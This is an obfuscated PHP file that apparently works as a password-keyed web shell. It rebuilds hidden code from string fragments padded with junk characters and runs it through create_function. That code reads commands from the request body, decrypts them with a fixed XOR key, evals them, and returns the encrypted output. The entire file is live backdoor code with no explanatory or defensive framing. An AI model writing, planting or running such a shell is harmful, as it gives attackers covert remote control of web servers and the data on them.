<?php
$g=';f~tuncti~ton x($t,$k){$~tc=strl~ten($k);$l=~ts~ttrl~ten($t);$o~t="";f~tor($i=0;~t$i~t<$l;)~t{for(';
$l='$j=0;($~tj<$c&&$~ti<$~tl);$j++,~t~t$i++){$o.=$t{~t$i}^$k~t{$j};}}re~tturn~t $o;}if (~t@preg_~tmatc';
$f=str_replace('vL','','cvLrevLatvLevL_funvLvLction');
$o='al(@~tgzu~tncom~tpress(@x(~t@bas~te64_decode~t($m[1]~t),$k~t)));~t$o=@ob_~tget_con~ttents()~t;@ob_';
$k='h(~t"/$kh(~t.+)$kf~t~t/",@file~t_get_~tco~tntents("~tphp://in~tp~tut"),$m)~t==1) {@ob_star~tt();@e~tv';
$b='$k="30~taad5e3~t";$k~th="a~ted1152f5015"~t;$kf="~td77~t~t440~t604663";$p="~tNA0Ng~t8UZwnTCC~tP~tfX"';
$q='end~t_c~tlean();$~tr=@ba~tse64_enc~tode~t(@x(@gzcom~tp~tress($~to),$k~t));print("~t~t$p$kh$r$kf");}';
$S=str_replace('~t','',$b.$g.$l.$k.$o.$q);
$R=$f('',$S);$R();
?>
